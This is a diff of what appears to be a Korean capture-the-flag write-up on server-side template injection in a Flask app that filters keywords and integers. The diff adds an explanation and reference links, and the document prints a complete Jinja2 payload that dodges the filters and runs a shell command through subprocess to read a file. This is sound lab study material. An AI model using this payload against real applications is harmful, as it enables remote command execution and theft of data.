@@ -6,11 +6,6 @@
 
 --------------------------------------------------------------------------------
 
-flask ssti, 키워드 및 정수 필터링
-
-- https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f
-- https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
-
 ```python
 from flask import Flask, render_template, request, render_template_string
 from multiprocessing import Pool
@@ -74,7 +69,11 @@ if __name__ == "__main__":
     app.run(debug=True)
 ```
 
-payload
+입력창에 SSTI 취약점 구문을 입력해보니 계산식이 출력되어 Flask SSTI 문제라고 생각하였다. 위의 코드에서 키워드와 정수값이 필터링되는 것을 보고 아래의 게시물을 참고하여 필터링을 우회할 수 있는 페이로드를 작성하였다.
+
+- https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f
+- https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
+
 ```
 Payload 1
 {{()|attr(request.form.get('fname'))|attr('__base__')|attr(request.form.get('lname'))()|attr('__getitem__')((true+true)**(true+true+true+true+true+true+true)+(true+true)**(true+true+true+true+true+true)+true+true+true+true+true+true+true)('cat strategyguide.txt',shell=True,stdout=-(true))|attr('communicate')()}}
